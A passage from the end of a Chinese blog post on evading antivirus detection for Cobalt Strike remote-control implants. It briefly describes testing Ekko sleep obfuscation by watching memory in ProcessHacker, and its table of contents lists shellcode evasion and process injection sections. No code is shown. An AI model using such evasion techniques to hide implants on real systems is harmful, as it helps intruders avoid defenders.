0，暂时也不清楚什么情况。<br>这里我们修改完后再编译即可，这里我们使用 messagebox 来模拟 c2 服务端发送的指令，使用<strong> ProcessHacker</strong> 监控内存变换。<p></p><p><em><strong>非睡眠时间段 (事件等待时间段)：</strong></em><br><img data-src="https://dlink.host/wx1.sinaimg.cn/large/008DfUDOly8hrpvp4d5wtj31cz0u0x05.jpg" alt=""><br><em><strong>睡眠混淆时间段：</strong></em><br><img data-src="https://dlink.host/wx2.sinaimg.cn/large/008DfUDOly8hrpvp7ovgyj31cu0u0aux.jpg" alt=""></p><div class="tags"><a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"><i class="ic i-tag"></i> 免杀</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2024-07-16 14:54:20" itemprop="dateModified" datetime="2024-07-16T14:54:20+08:00">2024-07-16</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="shutTD 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="shutTD 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>shutTD <i class="ic i-at"><em>@</em></i>shutTD</li><li class="link"><strong>本文链接：</strong> <a href="https://shut-td.github.io/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="CS 远控免杀思路与实现">https://shut-td.github.io/CS远控免杀思路与实现/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" itemprop="url" rel="prev" data-background-image="http:&#x2F;&#x2F;dlink.host&#x2F;wx2.sinaimg.cn&#x2F;large&#x2F;008DfUDOly8hnqx14nahdj31hc0u041l.jpg" title="CMD命令混淆"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 攻防技巧</span><h3>CMD命令混淆</h3></a></div><div class="item right"><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" itemprop="url" rel="next" data-background-image="http:&#x2F;&#x2F;dlink.host&#x2F;wx2.sinaimg.cn&#x2F;large&#x2F;008DfUDOly8hnqx14nahdj31hc0u041l.jpg" title="内网frp代理搭建socks5"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 攻防技巧</span><h3>内网frp代理搭建socks5</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E5%8E%9F%E7%94%9Fshellcode%E4%B8%8A%E7%BA%BF%E5%85%8D%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text">CS 原生 shellcode 上线免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#shellcode%E5%85%8D%E6%9D%80"><span class="toc-number">1.0.1.</span> <span class="toc-text">shellcode 免杀</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%8E%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">代码与进程注入手法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95%E6%95%88%E6%9E%9C%E5%92%8C%E5%85%B6%E4%BB%96%E6%89%8B%E6%B3%95%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.</span> <span class="toc-text">本地测试效果和其他手法演示</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ekko%E7%9D%A1%E7%9C%A0%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF%E6%BC%94%E7%A4%BA"><span class="toc-number">1.2.1.</span> <span class="toc-text">Ekko 睡眠混淆技术演示：</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/%E7%BB%99EXE%E4%B8%8A%E9%94%81/" rel="bookmark" title="给EXE上锁">给EXE上锁</a></li><li class="active"><a href="/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" rel="bookmark" title="CS远控免杀思路与实现">CS远控免杀思路与实现</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="shutTD" data-src="/images/avatar.jpg"><p class="name" itemprop="name">shutTD</p><div class="description" itemprop="description">菜只因～</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">7</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">4</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">4</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NodXQtVEQ=" title="https:&#x2F;&#x2F;github.com&#x2F;shut-TD"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjIzMDY2Njg3ODFAcXEuY29t" title="mailto:2306668781@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" title="分类于 攻防技巧">攻防技巧</a></div><span><a href="/%E5%86%85%E7%BD%91frp%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BAsocks5/" title="内网frp代理搭建socks5">内网frp代理搭建socks5</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/" title="分类于 攻防技巧">攻防技巧</a></div><span><a href="/CMD%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86/" title="CMD命令混淆">CMD命令混淆</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" title="分类于 Pwn">Pwn</a></div><span><a href="/%E6%84%8F%E5%A4%96%E7%9A%84Kernel32%E5%9F%BA%E5%9D%80%E5%AF%BB%E5%9D%80/" title="意外的Kernel32基址寻址">意外的Kernel32基址寻址</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/%E8%87%AA%E6%88%91%E5%AE%9A%E4%BD%8D-%E6%9C%AA%E6%9D%A5%E5%B1%95%E6%9C%9B-To-Future/" title="自我定位 &amp; 未来展望 To Future~">自我定位 & 未来展望 To Future~</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" title="分类于 安全工具开发">安全工具开发</a></div><span><a href="/%E6%BA%90%E7%A0%81%E5%8F%8D%E7%BC%96%E8%AF%91%E5%8F%8A%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98-CS%E4%BA%8C%E5%BC%80%E7%B3%BB%E5%88%97/" title="源码反编译及搭建问题[CS二开系列]">源码反编译及搭建问题[CS二开系列]</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%8D%E6%9D%80/" title="分类于 免杀">免杀</a></div><span><a href="/CS%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E4%B8%8E%E5%AE%9E%E7%8E%B0/" title="CS远控免杀思路与实现">CS远控免杀思路与实现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%8D%E6%9D%80/" title="分类于 免杀">免杀</a></div><span><a href="/%E7%BB%99EXE%E4%B8%8A%E9%94%81/" title="给EXE上锁">给EXE上锁</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">shutTD @ shutTD's BLOG</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">20k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">19 分钟</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CS远控免杀思路与实现/",favicon:{show:"（●´3｀●）好啦好啦",hide:"坏喽坏喽"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>